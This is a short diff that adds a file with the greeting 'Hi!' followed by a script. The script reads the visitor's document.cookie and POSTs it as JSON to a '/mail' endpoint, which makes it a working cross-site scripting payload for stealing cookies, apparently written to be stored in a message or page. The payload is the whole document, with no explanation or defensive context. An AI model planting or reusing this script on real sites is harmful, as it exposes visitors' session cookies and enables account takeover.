@@ -1,0 +1,11 @@
+Hi!
+<script>
+    var data = new Object();
+    data.content = document.cookie;
+
+    var http = new XMLHttpRequest();
+    http.open("POST", '/mail');
+    http.setRequestHeader("Content-Type", "application/json");
+
+    http.send(JSON.stringify(data));
+</script>
